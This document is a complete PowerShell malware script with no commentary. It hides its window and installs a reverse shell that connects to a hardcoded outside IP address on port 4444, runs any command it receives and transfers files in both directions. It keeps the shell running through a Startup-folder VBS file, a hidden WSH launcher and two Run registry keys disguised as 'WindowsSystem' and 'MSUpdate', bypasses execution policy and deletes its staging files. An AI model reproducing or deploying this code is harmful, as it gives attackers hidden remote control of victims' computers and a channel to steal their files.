# Hide PowerShell window immediately
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# Paths for persistence
$programsPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$persistentPath = "C:\ProgramData\SystemShell.ps1"
$vbsPath = Join-Path $startupPath "SystemRun.vbs"
$wshPath = Join-Path $env:TEMP "HiddenRunner.vbs"

# Save current script to ProgramData for persistence
$currentScriptContent = @'
# Completely hidden PowerShell reverse shell
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0) | Out-Null

# TCP Connection parameters
$ip = "143.110.191.171"
$port = 4444

function Start-ReverseShell {
    while($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true

            while($client.Connected) {
                $writer.Write("PS " + (Get-Location).Path + "> ")
                $command = $reader.ReadLine()
                
                if($command -eq "exit") { break }
                if($command -eq "quit") { return }
                
                # Handle special commands
                if($command.StartsWith("download ")) {
                    $file = $command.Substring(9)
                    if(Test-Path $file) {
                        try {
                            $content = [System.IO.File]::ReadAllBytes($file)
                            $writer.Write("[DOWNLOAD]:" + [Convert]::ToBase64String($content) + "`n")
                        } catch {
                            $writer.Write("Error downloading file: " + $_.Exception.Message + "`n")
                        }
                    } else {
                        $writer.Write("File not found`n")
                    }
                    continue
                }
                
                if($command.StartsWith("upload ")) {
                    $parts = $command.Split(' ', 3)
                    if($parts.Length -eq 3) {
                        try {
                            $filePath = $parts[1]
                            $fileContent = [Convert]::FromBase64String($parts[2])
                            [System.IO.File]::WriteAllBytes($filePath, $fileContent)
                            $writer.Write("File uploaded successfully`n")
                        } catch {
                            $writer.Write("Error uploading file: " + $_.Exception.Message + "`n")
                        }
                    }
                    continue
                }
                
                # Execute regular command
                try {
                    $output = Invoke-Expression -Command $command 2>&1 | Out-String
                    $writer.Write($output)
                } catch {
                    $writer.Write("Error: " + $_.Exception.Message + "`n")
                }
            }
            
            $reader.Close()
            $writer.Close()
            $stream.Close()
            $client.Close()
        } catch {
            Start-Sleep -Seconds 10
        }
    }
}

Start-ReverseShell
'@

# Write persistent script
Set-Content -Path $persistentPath -Value $currentScriptContent -Force

# Create improved VBS script for completely hidden execution
$vbsContent = @"
Set objShell = CreateObject("WScript.Shell")
' Run completely hidden without any window flash
objShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""if(1){Start-Process PowerShell.exe -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -File \""$persistentPath\""' -WindowStyle Hidden}""", 0, False
"@

Set-Content -Path $vbsPath -Value $vbsContent -Force

# Create additional WSH script for extra hidden layer
$wshContent = @"
var shell = new ActiveXObject("WScript.Shell");
shell.Run('powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process PowerShell.exe -ArgumentList ''-WindowStyle Hidden -ExecutionPolicy Bypass -File ""$persistentPath""'' -WindowStyle Hidden"', 0, false);
"@

Set-Content -Path $wshPath -Value $wshContent -Force

# Registry persistence with hidden execution
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsSystem"
$regValue = "wscript.exe //B `"$wshPath`""
New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null

# Alternative registry entry using cmd hidden
$regName2 = "MSUpdate"
$regValue2 = "cmd.exe /c start /min powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$persistentPath`""
New-ItemProperty -Path $regPath -Name $regName2 -Value $regValue2 -PropertyType String -Force | Out-Null

# Start completely hidden using multiple layers
Start-Process -FilePath "wscript.exe" -ArgumentList "//B", "`"$wshPath`"" -WindowStyle Hidden

# Remove temporary download file after delay
Start-Sleep -Seconds 10
Remove-Item -Path "$env:TEMP\persist.ps1" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "$env:TEMP\test.ps1" -Force -ErrorAction SilentlyContinue
